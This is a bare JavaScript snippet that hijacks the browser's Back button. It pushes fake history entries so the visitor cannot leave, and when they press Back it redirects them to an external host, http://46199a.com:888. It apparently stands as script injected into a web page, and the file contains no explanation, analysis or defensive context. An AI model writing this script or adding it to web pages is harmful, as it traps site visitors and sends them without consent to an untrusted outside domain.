  $(document).ready(function(){      
    
     window.addEventListener("popstate",
         function(e) {
         location="http://46199a.com:888/#88888"      
     }, false);

    pushHistory();
    window.addEventListener("popstate", function (e) {
         pushHistory();
      
        

    }, false);


        });   

    function pushHistory() {
        var state = {
            title: "title",
            url: "#"
        };
        window.history.pushState(state, "title", "#");
    }
